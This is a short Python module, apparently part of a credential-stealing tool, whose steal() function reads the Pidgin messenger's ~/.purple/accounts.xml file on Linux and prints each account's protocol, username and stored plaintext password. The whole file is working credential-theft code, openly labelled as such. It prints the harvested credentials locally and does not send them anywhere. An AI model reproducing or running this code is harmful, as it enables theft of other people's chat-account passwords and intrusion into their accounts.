import platform
# Linux
if platform.system() == "Linux":
	import os
	import xml.etree.ElementTree as xml

def steal():
	# Only Linux is supported for now
	if platform.system() == "Linux":
		acc = steal_linux()
		for _a in acc:
			print(_a)
# Linux steal
def steal_linux():
	accounts = list()
	path = os.getenv("HOME") + "/.purple/accounts.xml"
	root = xml.parse(path).getroot()
	for acc in root:
		if acc[2].tag == "password":
			accounts.append("[+] Protocol:{proto}\n    Username:{us}\n    Password:{pw}\n".format(us=acc[1].text,pw=acc[2].text,proto=acc[0].text.split('prpl-')[1]))
	return accounts

